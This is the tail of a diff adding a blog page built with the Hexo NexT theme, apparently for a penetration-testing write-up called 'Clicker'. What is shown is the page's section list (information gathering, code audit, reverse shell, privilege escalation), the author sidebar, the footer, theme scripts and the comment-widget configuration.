+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Clicker"><span class="nav-number">1.</span> <span class="nav-text">Clicker</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.2.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
